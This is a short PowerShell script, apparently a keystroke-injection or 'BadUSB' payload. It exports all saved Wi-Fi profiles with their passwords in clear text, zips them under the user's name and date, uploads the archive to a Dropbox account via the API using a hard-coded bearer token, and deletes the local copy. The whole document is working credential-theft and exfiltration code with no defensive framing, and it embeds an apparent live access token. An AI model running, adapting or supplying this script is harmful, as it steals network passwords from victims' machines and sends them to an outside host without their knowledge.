mkdir $env:Temp\Netwerk
netsh wlan export profile key=clear folder=$env:Temp\Netwerk
Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.BpfDb4gzoL7GjFWNCLC9mKbzU0JXwk4sQHqwqTAUhdRK79MNzN3MALj9d4yMPw6dRAK32-2kLwPuGhf6dejPFNe6HOwlMjoVug4PLOZk769shwHK2JSaJISA7lIklRexflxi1qRGIyOA2IE"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath
